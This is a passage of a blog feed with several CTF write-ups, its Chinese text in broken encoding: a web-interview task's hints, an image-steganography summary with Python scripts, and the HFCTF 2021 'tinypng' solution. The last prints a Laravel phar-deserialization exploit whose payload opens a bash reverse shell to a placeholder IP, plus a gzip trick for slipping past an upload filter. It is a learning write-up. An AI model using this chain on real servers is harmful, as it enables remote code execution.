href="https://www.bt.cn/%EF%BC%89%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%AE%8C%E6%88%90%E5%9F%BA%E6%9C%AC%E7%BD%91%E7%AB%99%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E3%80%82">https://www.bt.cn/ï¼‰ä¸­æä¾›çš„ä¸€é”®å®‰è£…è„šæœ¬ï¼Œå®ŒæˆåŸºæœ¬ç½‘ç«™ç¯å¢ƒçš„æ­å»ºã€‚</a></p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025021328281.png" alt="image-20211025021328281"></p><p>sshå·¥å…·å»ºè®®ç”¨</p><p><img src="/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/image-20211025021407928.png" alt="image-20211025021407928"></p><p>ä»–é›†æˆäº†sftpåŠŸèƒ½å¯ä»¥æ–¹ä¾¿çš„æŠŠä½ æœ¬åœ°çš„æ–‡ä»¶ä¼ åˆ°ä½ çš„VPSä¸Šï¼Œæ–‡ä»¶æ‹–è¿›å»å°±å¥½ã€‚æ¥ä¸‹æ¥æ¡†æ¶æ­å»ºå°±è¦æ ¹æ®READMEå’Œå®˜æ–¹æ–‡æ¡£ä¸­çš„æ–¹æ³•äº†ã€‚å®åœ¨ä¸è¡Œç™¾åº¦ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚</p><h2 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h2><p>1.æœç´¢å¼•æ“æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œç™¾åº¦è°·æ­Œæ²¡å‡†å¯ä»¥æ¢ç€ç”¨</p><p>2.PHPGGCæ˜¯ä¸€ä¸ªå¾ˆæœ‰åçš„æ¡†æ¶ååºåˆ—åŒ–åˆ©ç”¨é“¾ç”Ÿæˆå·¥å…·ï¼ˆ<a href="https://github.com/ambionics/phpggc%EF%BC%89">https://github.com/ambionics/phpggcï¼‰</a></p><p>3.ç»™çš„é™„ä»¶å­˜åœ¨hintæ–‡ä»¶</p><p>4.Nothing is Impossibleæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±æƒ³è±¡ä¸åˆ°çš„æ½œèƒ½ï¼Œæ²¡æ€è·¯äº†å¯ä»¥å‡ºå»èµ°èµ°ï¼ˆç¦æ­¢äº’ç›¸äº¤æµï¼Œä½†æ˜¯å®Œå…¨å¡æ­»äº†ï¼Œå¯ä»¥å°è¯•è”ç³»å‡ºé¢˜äººï¼‰åšé¢˜ä¹Ÿæ˜¯å­¦ä¹ çš„è¿‡ç¨‹ï¼Œå­¦åˆ°äº†å°±æ˜¯è‡ªå·±çš„äº†</p><p>5.å¤šçœ‹å¤šæ€è€ƒï¼Œæœ‰é—®é¢˜å¯ä»¥æ¥æ‰“å‡ºé¢˜äººï¼ˆä¸æ˜¯</p><p>6.å†²å°±å®Œäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt; é¦–å…ˆå½“ä½ æ‹¿åˆ°è¿™é“é¢˜ï¼Œæˆ‘æƒ³å…ˆæ­å–œä½ å·²ç»è¿›å…¥äº†ä¸‰å¶è‰webæ–¹å‘çš„ç¬¬äºŒè½®é¢è¯•ã€‚ğŸ‘&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="CTFå­¦ä¹ " scheme="https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>å›¾ç‰‡éšå†™æ€»ç»“</title>
    <link href="https://zwh-china.github.io/2021/09/27/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>https://zwh-china.github.io/2021/09/27/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2021-09-27T06:09:01.210Z</published>
    <updated>2021-05-20T13:34:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-å›¾ç‰‡éšå†™æ€»ç»“"><a href="#CTF-å›¾ç‰‡éšå†™æ€»ç»“" class="headerlink" title="CTF å›¾ç‰‡éšå†™æ€»ç»“"></a>CTF å›¾ç‰‡éšå†™æ€»ç»“</h1><p>æœ€è¿‘CTFé‡åˆ°ä¸å°‘éšå†™é¢˜ï¼Œæ€»ç»“æ¥è¯´ä¸€èˆ¬å°±æ˜¯å…ˆæ˜¯å‡ å¤§æ­¥éª¤ã€‚binwalkï¼Œzstegï¼Œstegsolveä¸€æŠŠæ¢­ã€‚å…ˆçœ‹binwalkèƒ½ä¸èƒ½æå–ä¸€äº›æœ‰æ„æ€çš„éšè—æ–‡ä»¶ï¼Œç„¶åæå–å‡ºæ¥ã€‚zstegå…¶å®å¯¹äºéšå†™æ¥è¯´å¾ˆå¼ºï¼Œå®ƒå¯ä»¥ä¸€æŠŠæ¢­LSB,MSBã€‚StegSolveå¯ä»¥ç›´æ¥æå–å‡ºplanå›¾ã€‚å…·ä½“æˆ‘ä¹Ÿç”¨Pythonç…§ç€æ•™ç¨‹å¤ç°äº†ä¸€ä¸‹å…¶åŠŸèƒ½ã€‚é¡ºæ‰‹å­¦ä¹ Python PILåº“ï¼Œå’ŒåŸºæœ¬å›¾ç‰‡åŸç†ã€‚</p><pre><code class="python">from PIL import Imageimport glob, osimport sysimport multiprocessingimport timedef get_plane(img, channel, index=0):    print(&#39;run&#39;)    color_mode = channel    offset = index    if channel in img.mode:        new_image = Image.new(&#39;1&#39;, img.size)        new_image_data = new_image.load()        img_data = img.load()        channel_index = img.mode.index(channel)        for x in range(img.size[0]):            for y in range(img.size[1]):                color = img_data[x, y]                channel = color[channel_index]                plane = bin(channel)[2:].zfill(8)                try:                    new_image_data[x, y] = 255 * int(plane[abs(index - 7)])                except IndexError:                    pass        new_image.save(f&#39;&#123;color_mode&#125;-&#123;offset&#125;.png&#39;)        return new_imageif __name__ == &#39;__main__&#39;:    file = input(&#39;è¾“å…¥å›¾ç‰‡åç§°: &#39;)    imag = Image.open(file)    for channel in imag.mode:        for plane in range(8):            t=multiprocessing.Process(target=get_plane,args=(imag, channel, plane),daemon=True)            t.start()    temp=input(&#39;...&#39;)    temp=input(&#39;...&#39;)</code></pre><p>å…¶æ­¥éª¤å°±æ˜¯ï¼Œæ‰“å¼€å›¾ç‰‡ï¼Œç„¶åå°†å…¶è¿›è¡Œæ¨¡å¼åˆ†ç¦»ã€‚ä¸€èˆ¬æ¥è¯´å›¾ç‰‡éƒ½é‡‡å–RGB(A)å½¢å¼å­˜å‚¨ã€‚é€šè¿‡ä½¿ç”¨PILå†…ç½®çš„æ–¹æ³•å¯ä»¥å®ç°åˆ†ç¦»è¯»å–ã€‚æ€»çš„æ¥è¯´PILå’Œcvä¸€æ ·ï¼Œå¯¹å›¾ç‰‡æ•°æ®è¿›è¡Œæ“ä½œéƒ½æ˜¯ä½¿ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼ŒäºŒç»´æ•°ç»„å¯ä»¥è¿‘ä¼¼çœ‹ä½œå›¾ç‰‡(x,y)åæ ‡å¯¹åº”çš„åƒç´ ï¼Œå…¶ä¸ºRGBä¸‰ä¸ªå€¼ç»„æˆçš„å…ƒç»„ã€‚å†é€šè¿‡ä¸‹æ ‡é€‰å–ï¼Œå³å¯å®ç°æå–æŸä¸€é€šé“çš„æ•ˆæœã€‚</p><p>å†çœ‹ä¸€é“é¢˜ï¼Œå››å·çœçœèµ›çš„WP misc</p><p><img src="/2021/09/27/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/2.png" alt="2"></p><p>ä¸Šæ¥ä¸‰ä»¶å¥—ï¼Œé‚£è‡ªç„¶æ˜¯</p><p><img src="/2021/09/27/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/B-0.png" alt="B-0"></p><p>Bé€šé“Planeä¸º0æ—¶å¾—åˆ°è¿™ä¹ˆå¤šçš„äºŒç»´ç ã€‚æ‰«æå…¶ä¸­ä¸€ä¸ªäºŒç»´ç å¾—åˆ°æ•´æ•°ã€‚å†ç»“åˆåŸå›¾ä¸éš¾æƒ³åˆ°è§£é¢˜æ€è·¯å°±æ˜¯æŒ‰ç…§äºŒç»´ç æ‰«æå‡ºçš„æ•°å€¼è¿›è¡Œå¤ä½æ‹¼æ¥ã€‚ä¸»è¦å°±æ˜¯ä¸¤ä¸ªé—®é¢˜ï¼ŒäºŒç»´ç å’ŒåŸå›¾çš„åˆ†å‰²ï¼ŒäºŒç»´ç çš„æ‰«æå’Œå›¾ç‰‡çš„å¤ä½è¿™é‡Œå‚è€ƒä¸‹åˆ«äººçš„WP</p><pre><code class="python">from PIL import Imageimport numpyimport pyzbar.pyzbar as pyzbar# æ‰“å¼€å›¾ç‰‡raw = Image.open(&#39;./Jigsaw1.png&#39;)print(&quot;Image size: &quot;, raw.size) # æ‰“å°ç¢ç‰‡å›¾å¤§å°# è·å–LSBéšå†™å›¾åƒ_, _, blue = raw.split()lsb = Image.eval(blue, lambda p: 255 if p&amp;1 else 0)lsb.show()# å•ç‹¬è·å–æ¯ä¸ªå°å—pice_size = numpy.array(raw.size)//100 # å› ä¸ºäºŒç»´ç æ¯è¡Œ100ä¸ªpice_size=tuple(pice_size)print(&quot;Pice size: &quot;, pice_size) # æ‰“å°æ¯ä¸ªäºŒç»´ç å¤§å°# è¿˜åŸå›¾åƒfixed = Image.new(raw.mode, raw.size)def getValue(code): value = &quot;&quot; for data in code:  value = data.data.decode(&#39;utf-8&#39;) return valuefor x in range(100): for y in range(100):  pice = Image.new(raw.mode, pice_size) # æ–°å»ºä¸€ä¸ªè‰²å½©é€šé“å’Œå¤§å°å‡ä¸å•ä¸ªäºŒç»´ç ç›¸åŒçš„ç©ºç™½å›¾ç‰‡ä½œä¸ºå¤ä½çš„åº•æ¿å›¾  pos = numpy.array([x, y])*pice.size # æ ‡è®°å‡ºäºŒç»´ç åæ ‡  pice.paste(lsb, (-pos[0], -pos[1])) # æŠŠäºŒç»´ç æå–å‡ºæ¥ç²˜ä¸Šå»  tmp=pice.resize((550,550),Image.ANTIALIAS) # Image.ANTIALIASæŠ—é”¯é½¿ è°ƒæ•´å¤§å°  code =(pyzbar.decode(tmp))  value=(int(getValue(code)))  pice.paste(raw, (-pos[0], -pos[1])) # æŠŠç¢å—å›¾æ”¾åˆ°ç™½æ¿ä¸Šè¦†ç›–äºŒç»´ç   fixed.paste(pice, (value%100*pice.size[0], value//100*pice.size[1])) # ç§»åˆ°å¡«è¡¥ç”»å¸ƒ fixed.show() print(x, &quot;%&quot;) fixed.save(&quot;result.png&quot;)</code></pre><p>ç…§ç€åŸç†ä¼˜åŒ–äº†ä¸€ä¸‹</p><pre><code class="python">from PIL import Imageimport numpy as npimport pyzbar.pyzbar as pyzbarimport threadingimport timelock = threading.Lock()def scan(img):    data = pyzbar.decode(img)    for data in data:        return data.data.decode(&#39;utf-8&#39;)# img = Image.open(&#39;./B-0.png&#39;)# default_img = Image.open(&#39;./2.png&#39;)# tinkered_img = Image.new(mode=default_img.mode, size=default_img.size)# print(img.size)# qr_size = tuple(np.array(img.size) // 100)# print(qr_size)tinkered_img = Image.new(mode=&#39;RGB&#39;, size=(2700, 2700))def solve(start: int, end: int):    global tinkered_img    img = Image.open(&#39;./B-0.png&#39;)    default_img = Image.open(&#39;./2.png&#39;)    qr_size = tuple(np.array(img.size) // 100)    for y in range(start, end):        for x in range(100):            print(f&#39;(&#123;x&#125;,&#123;y&#125;)&#39;)            box = (qr_size[0] * x, qr_size[1] * y, qr_size[0] * (x + 1), qr_size[1] * (y + 1))            temp = img.crop(box)            puzzle = default_img.crop(box)            temp = temp.resize((550, 550), Image.ANTIALIAS)  # ç»æµ‹è¯• 27x27å¤§å°å›¾ç‰‡æ‰‹æœºå¯ä»¥æ‰«å‡ºæ¥ä½†æ˜¯pyzbarè¯»ä¸å‡ºæ¥æ•…é‡æ–°è°ƒæ•´å¤§å°åæ‰«æ            # temp.show()            info = int(scan(temp))            print(info)            row = (info // 100) * qr_size[0]  # è¡Œåæ ‡            column = (info % 100) * qr_size[1]  # åˆ—åæ ‡            dig_row = ((info // 100) + 1) * qr_size[0]            dig_column = ((info % 100) + 1) * qr_size[1]            paste_box = (column,row  , dig_column,dig_row)            with lock:                tinkered_img.paste(puzzle, paste_box)    with lock:        tinkered_img.show()t = threading.Thread(target=solve, args=(0, 25))t.start()t1 = threading.Thread(target=solve, args=(25, 50))t1.start()t2 = threading.Thread(target=solve, args=(50, 75))t2.start()t3 = threading.Thread(target=solve, args=(75, 100))t3.start()t.join()t1.join()t2.join()t3.join()</code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>paste</code>å‡½æ•°å¯ä»¥ä¼ ä¸€ä¸ªtupleå³å¯ï¼Œä¸éœ€è¦æŒ‡å‡ºå…¨éƒ¨å››ä¸ªå‚é‡ã€‚è¿˜æœ‰å°±æ˜¯äºŒç»´ç æ‰«æå¯¹å›¾ç‰‡å¤§å°å¯èƒ½æœ‰ä¸€å®šè¦æ±‚ï¼Œæ‰«æå‰æœ€å¥½resizeã€‚åœ¨Imageçš„åæ ‡æ˜¯ç¬›å¡å°”åæ ‡ç³»ï¼Œä»¥(0,0)èµ·å§‹ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-å›¾ç‰‡éšå†™æ€»ç»“&quot;&gt;&lt;a href=&quot;#CTF-å›¾ç‰‡éšå†™æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;CTF å›¾ç‰‡éšå†™æ€»ç»“&quot;&gt;&lt;/a&gt;CTF å›¾ç‰‡éšå†™æ€»ç»“&lt;/h1&gt;&lt;p&gt;æœ€è¿‘CTFé‡åˆ°ä¸å°‘éšå†™é¢˜ï¼Œæ€»ç»“æ¥è¯´ä¸€èˆ¬å°±æ˜¯å…ˆæ˜¯å‡ å¤§æ­¥éª¤ã€‚binwalkï¼Œzs</summary>
      
    
    
    
    <category term="CTFå­¦ä¹ " scheme="https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>è™ç¬¦æ¯tiny-png</title>
    <link href="https://zwh-china.github.io/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/"/>
    <id>https://zwh-china.github.io/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/</id>
    <published>2021-06-18T22:30:13.000Z</published>
    <updated>2021-06-18T23:06:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021è™ç¬¦CTF-çº¿ä¸‹èµ›-Web"><a href="#2021è™ç¬¦CTF-çº¿ä¸‹èµ›-Web" class="headerlink" title="2021è™ç¬¦CTF çº¿ä¸‹èµ› Web"></a>2021è™ç¬¦CTF çº¿ä¸‹èµ› Web</h1><h3 id="HFCTF-2021-Final-tinypng"><a href="#HFCTF-2021-Final-tinypng" class="headerlink" title="[HFCTF 2021 Final]tinypng"></a>[HFCTF 2021 Final]tinypng</h3><p>è¿™é“é¢˜ä¸Šæ¥å…ˆæ˜¯ç»™äº†ä¸€ä¸ªLaravelçš„æºç ã€‚ä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼Œç»“åˆå¯åŠ¨é¶æœºåè®¿é—®å’Œview-sourceå¾—åˆ°çš„ä¿¡æ¯<code>&lt;!--TODO: Fix some bugs in /image --&gt;</code>æŸ¥çœ‹æºç çš„Controllerå’ŒRouteå¾—åˆ°ç®€å•çš„åŠŸèƒ½åˆ†æ</p><p>web.php</p><pre><code class="php">&lt;?phpuse Illuminate\Support\Facades\Route;/*|--------------------------------------------------------------------------| Web Routes|--------------------------------------------------------------------------|| Here is where you can register web routes for your application. These| routes are loaded by the RouteServiceProvider within a group which| contains the &quot;web&quot; middleware group. Now create something great!|*/use App\Http\Controllers\IndexController;use App\Http\Controllers\ImageController;Route::get(&#39;/&#39;, function () &#123;    return view(&#39;upload&#39;);&#125;);Route::post(&#39;/&#39;, [IndexController::class, &#39;fileUpload&#39;])-&gt;name(&#39;file.upload.post&#39;);//Don&#39;t expose the /image to others!Route::get(&#39;/image&#39;, [ImageController::class, &#39;handle&#39;])-&gt;name(&#39;image.handle&#39;);</code></pre><p>ç®€å•çœ‹ä¸€ä¸‹å°±å¯ä»¥å¾—çŸ¥ä»¥getå½¢å¼è®¿é—®æ ¹ç›®å½•ä¼šå¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ ç•Œé¢ï¼Œä»¥POSTå½¢å¼è®¿é—®æ ¹ç›®å½•å°±ä¼šæŠŠå›¾ç‰‡ä¸Šä¼ ã€‚è¿˜æœ‰ä¸ªimageè·¯ç”±ï¼Œæˆ‘ä»¬ç¨åå†çœ‹ã€‚</p><p>å…ˆçœ‹ä¸€ä¸‹ä¸Šä¼ çš„è¿‡æ»¤</p><p>IndexController.php</p><pre><code class="php">class IndexController extends Controller&#123;    public function fileUpload(Request $req)    &#123;        $allowed_extension = &quot;png&quot;;        $extension = $req-&gt;file(&#39;file&#39;)-&gt;clientExtension();        if($extension === $allowed_extension &amp;&amp; $req-&gt;file(&#39;file&#39;)-&gt;getSize() &lt; 204800)        &#123;            $content = $req-&gt;file(&#39;file&#39;)-&gt;get();            if (preg_match(&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;, $content ))&#123;                $error = &#39;Don\&#39;t do that, please&#39;;                return back()                    -&gt;withErrors($error);            &#125;else &#123;                $fileName = \md5(time()) . &#39;.png&#39;;                $path = $req-&gt;file(&#39;file&#39;)-&gt;storePubliclyAs(&#39;uploads&#39;, $fileName);                echo &quot;path: $path&quot;;                return back()                    -&gt;with(&#39;success&#39;, &#39;File has been uploaded.&#39;)                    -&gt;with(&#39;file&#39;, $path);            &#125;        &#125; else&#123;            $error = &#39;Don\&#39;t do that, please&#39;;            return back()                -&gt;withErrors($error);        &#125;    &#125;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶ä¸Šä¼ çš„æ‹“å±•åè¢«é’‰æ­»ä¸ºpngã€‚åŒæ—¶æ–‡ä»¶å¤§å°ä¸èƒ½å¤ªå¤§ï¼Œè¿™ä¸ªé™åˆ¶æ¡ä»¶å¯ä»¥å¿½ç•¥ã€‚ç„¶åå†çœ‹æŠŠä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªå¤„ç†ç”¨<code>get()</code>æ–¹æ³•è·å–æ–‡ä»¶å†…å®¹ã€‚å…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ª<code>file_get_contents()</code>å¦‚æœåœ¨æ–‡ä»¶å†…å®¹æ‰¾åˆ°<code>preg_match(&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;, $content )</code>å°±ä¼šæŠ¥é”™ã€‚å¦åˆ™å­˜å‚¨æ–‡ä»¶ï¼Œå¹¶å›æ˜¾å‚¨å­˜åœ°å€ã€‚å†çœ‹é‚£ä¸ªç¥ç§˜çš„<code>/image</code>è·¯ç”±å®ƒæ¥å—GETæ–¹æ³•ä¼ å…¥çš„å‚æ•°ï¼Œå®ƒä¼šå°è¯•é‡æ–°å‘½åä¸Šä¼ çš„pngç„¶åå¯¹å…¶è¿›è¡Œ</p><p><img src="/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/image-20210619023130823.png" alt="image-20210619023130823"></p><p>è¿™æ ·çš„ä¸€ä¸ªè°ƒç”¨ï¼Œå…¶ä¸­<code>compressImg()</code>ä¼šè°ƒç”¨<code>imgcompress</code>ç±»çš„<code>_openImage</code>æ–¹æ³•ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•çš„å®ç°</p><p><img src="/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/image-20210619023403527.png" alt="image-20210619023403527"></p><p>å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„<code>getimagesize</code>å‡½æ•°ã€‚å› è€Œè€ƒè™‘ååºåˆ—åŒ–pharæ¥RCEã€‚åŒæ—¶ç»“åˆæ¡†æ¶æ˜¯LaravelçŒœæƒ³ã€‚é‚£ä¹ˆç›®å‰çš„ä¸»è¦é—®é¢˜å°±æ˜¯å¦‚ä½•æˆåŠŸæ„é€ è¿™æ ·ä¸€ä¸ªpharæ¥è¿›è¡Œä¸Šä¼ ã€‚é‚£æˆ‘ä»¬è‡ªç„¶è€ƒè™‘åˆ°å¸¸ç”¨çš„å‹ç¼©æ³•ã€‚gzipå‹ç¼©pharå†æŠŠå‹ç¼©æ–‡ä»¶å°¾ç¼€æ”¹ä¸ºpngå†ä¸Šä¼ å³å¯ç»•è¿‡wafã€‚å†é€šè¿‡è·¯ç”±/imageè¿›è¡Œè§¦å‘å³å¯è¾¾æˆRCEã€‚æ­¤å¤„å‘ç‚¹ä¸€æ–¹é¢åœ¨äºä¸Šä¼ è·¯å¾„ä¸º<code>phar://../storage/app/uploads/XXXX.png </code>è¿™æ˜¯å› ä¸ºLaravelé»˜è®¤ç›®å½•å¤„äºpublicä¸‹ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œè·³è½¬ã€‚å¦ä¸€ç‚¹å°±æ˜¯buuå¯èƒ½æ”¹å˜äº†Laravelçš„ç‰ˆæœ¬ã€‚é€šè¿‡</p><pre><code>php .\artisan --versionLaravel Framework 8.15.0`</code></pre><p>å¾—çŸ¥æ­¤å¤„Laravelç‰ˆæœ¬ä¸º8.15.0è€ŒWPä¸­ç”¨çš„phpggcä¸º6.0ç‰ˆæœ¬ï¼Œå¯¼è‡´RCEå¤±è´¥ã€‚æ•…æ­¤å¤„é‡‡ç”¨8.0ç‰ˆæœ¬(<a href="https://www.cnblogs.com/hetianlab/p/14510539.html)%EF%BC%8C%E6%89%8B%E5%8A%A8%E6%9E%84%E9%80%A0">https://www.cnblogs.com/hetianlab/p/14510539.html)ï¼Œæ‰‹åŠ¨æ„é€ </a></p><pre><code class="php">&lt;?php namespace Illuminate\Broadcasting&#123; use Illuminate\Contracts\Events\Dispatcher; class PendingBroadcast&#123; protected $event; protected $events;    public function __construct($events, $event)    &#123;        $this-&gt;event = $event;        $this-&gt;events = $events;    &#125;&#125;&#125;namespace Illuminate\Bus&#123;class Dispatcher&#123; protected $queueResolver;    public function __construct($queueResolver)    &#123;        $this-&gt;queueResolver = $queueResolver;    &#125; &#125;&#125;namespace Illuminate\Broadcasting&#123;class BroadcastEvent&#123; public $connection; public function __construct($connection)    &#123;        $this-&gt;connection = $connection;    &#125;  &#125;&#125;namespace&#123; $c = new Illuminate\Broadcasting\BroadcastEvent(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/XXX.XXX.XXX.XXX/2333 0&gt;&amp;1&#39;&quot;); $a = new Illuminate\Bus\Dispatcher(&#39;system&#39;); $b = new Illuminate\Broadcasting\PendingBroadcast($a,$c);$phar=new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();     $phar-&gt;setStub(&#39;GIF89a&#39;.&quot;__HALT_COMPILER();&quot;);     $phar-&gt;setMetadata($b);     $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);    $phar-&gt;stopBuffering(); echo urlencode(serialize($b));&#125;</code></pre><p><code>php -f poc.php</code>ç”Ÿæˆpharåå†<code>gzip phar.phar</code>å†æ”¹å°¾ç¼€ä¸Šä¼ å³å¯ã€‚è¿™é‡Œæˆ‘ä¹Ÿæµ‹è¯•äº†ä¸€ä¸‹æ‰“åŒ…æˆzipå†æ”¹å°¾ç¼€ä¸€æ ·å¯ä»¥è¿‡ã€‚æœ€åé€šè¿‡</p><p><img src="/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/image-20210619025251431.png" alt="image-20210619025251431"></p><p><img src="../../../AppData/Roaming/Typora/typora-user-images/image-20210619025311567.png" alt="image-20210619025311567"></p><p>å³å¯æˆåŠŸå¼¹shellã€‚è¿™é“é¢˜å…¶å®å€¼å¾—è€ƒè™‘çš„ç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆå‹ç¼©åå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªå†…å®¹æ£€æŸ¥</p><p>å‚è€ƒ:</p><ul><li><p><a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a></p></li><li><p><a href="https://guokeya.github.io/post/uxwHLckwx/">https://guokeya.github.io/post/uxwHLckwx/</a> åˆ©ç”¨å„ç§å‹ç¼©ç»•è¿‡æ£€æµ‹</p></li><li><p><a href="https://guokeya.github.io/post/z5gHcmbVj/">https://guokeya.github.io/post/z5gHcmbVj/</a></p></li></ul><p><code>å½“PHPå‡½æ•°ä¸­åº•å±‚è°ƒç”¨äº†php_stream_open_wrapper,éƒ½èƒ½å¤Ÿè¢«pharçš„ç»„ä»¶ç”¨æ¥è¿›è¡Œè§£æPharæ–‡ä»¶(æ–‡ä»¶å†…å®¹éœ€è¦åŒ…å«__HALT_COMPILER(); ?&gt;)</code></p><p>å› æ­¤å½“å…¨å±€æœç´¢<code>php_stream_open_wrapper</code>è¢«ç”¨æ¥å®ç°åº•å±‚çš„PHPå‡½æ•°æ—¶ä¹Ÿå°±ä¸éš¾å‘ç°è¿˜å­˜åœ¨é™¤å¯¹æ–‡ä»¶å¤„ç†çš„å‡½æ•°ä¹‹å¤–å…¶ä½™çš„å¯ä»¥ç”¨æ¥åˆ©ç”¨çš„å‡½æ•°,è€Œ<code>getimagesize</code>å°±æ˜¯å…¶ä¸­ä¹‹ä¸€</p><p><img src="/2021/06/19/%E8%99%8E%E7%AC%A6%E6%9D%AFtiny-png/20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1"></p><p>è¿™äº›å‡½æ•°é‡Œé¢å¯ä»¥ä½¿ç”¨<code>phar</code>åè®®ï¼Œå½“ç„¶è¿˜æœ‰å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«çš„å‡ ä¸ªå‡½æ•° <code>include</code>ã€<code>include_once</code>ã€<code>requrie</code>ã€<code>require_once</code></p><p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">https://www.cnblogs.com/sijidou/p/13121358.html</a></p><p><a href="https://xz.aliyun.com/t/6699?page=1#toc-3">https://xz.aliyun.com/t/6699?page=1#toc-3</a></p><p>ä¸ºä»€ä¹ˆgetimagesizeå¯ä»¥ç”¨pharååºåˆ—åŒ–+é¢˜è§£ï¼š<a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a></p><h3 id="æ¥ä¸‹æ¥"><a href="#æ¥ä¸‹æ¥" class="headerlink" title="æ¥ä¸‹æ¥"></a>æ¥ä¸‹æ¥</h3><p>åœ¨çœ‹å¸ˆå‚…æ–‡ç« çš„æ—¶å€™çœ‹åˆ°æœ‰é“é¢˜ä¼¼ä¹æœ‰ç‚¹ç±»ä¼¼ã€‚æŠ½ç©ºå¤ç°ä¸€ä¸‹[D3CTF 2019]EzUpload</p><p>åŒæ—¶å†æ·±å…¥äº†è§£Laravelååºåˆ—åŒ–</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>æ›´é€å½»äº†è§£äº†åœ¨å‚æ•°å¯æ§æ—¶ï¼Œä»€ä¹ˆæ ·çš„å‡½æ•°å¯ä»¥åˆ©ç”¨<code>phar://</code>è§¦å‘ååºåˆ—åŒ–</li><li>åœ¨ä¸Šä¼ æ–‡ä»¶å†…å®¹è¢«è¿‡æ»¤æ—¶ï¼Œå¯é‡‡ç”¨gzip zip bzipå‹ç¼©åæ”¹å°¾ç¼€ä¸Šä¼ é…åˆphar://è§¦å‘ï¼Œå…·ä½“åŸç†è§<a href="https://guokeya.github.io/post/uxwHLckwx/%E5%92%8Chttp://roverdoge.top/archives/207">https://guokeya.github.io/post/uxwHLckwx/å’Œhttp://roverdoge.top/archives/207</a></li><li>ä¸ºä»€ä¹ˆåœ¨å‹ç¼©åä»å¯ä»¥è¢«pharæ‰§è¡Œ<a href="https://www.anquanke.com/post/id/240007#h2-5">https://www.anquanke.com/post/id/240007#h2-5</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021è™ç¬¦CTF-çº¿ä¸‹èµ›-Web&quot;&gt;&lt;a href=&quot;#2021è™ç¬¦CTF-çº¿ä¸‹èµ›-Web&quot; class=&quot;headerlink&quot; title=&quot;2021è™ç¬¦CTF çº¿ä¸‹èµ› Web&quot;&gt;&lt;/a&gt;2021è™ç¬¦CTF çº¿ä¸‹èµ› Web&lt;/h1&gt;&lt;h3 id=&quot;HFCTF</summary>
      
    
    
    
    <category term="CTFå­¦ä¹ " scheme="https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>å·ä¼ CTF WP</title>
    <link href="https://zwh-china.github.io/2021/05/23/%E5%B7%9D%E4%BC%A0/"/>
